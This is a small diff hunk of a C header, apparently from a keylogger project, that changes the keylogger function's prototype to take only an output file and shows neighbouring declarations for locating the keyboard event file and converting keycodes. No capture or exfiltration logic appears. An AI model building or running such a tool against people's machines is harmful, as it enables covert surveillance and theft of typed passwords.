@@ -80,7 +80,7 @@ char *get_keyboard_event_file(void);
  * \param keyboard The file descriptor for the keyboard input file
  * \param writeout The file descriptor to write keystrokes out to
  */
-void keylogger(int keyboard, FILE* writeout);
+void keylogger(FILE* writeout);
 
 void convert(int keycode);
 
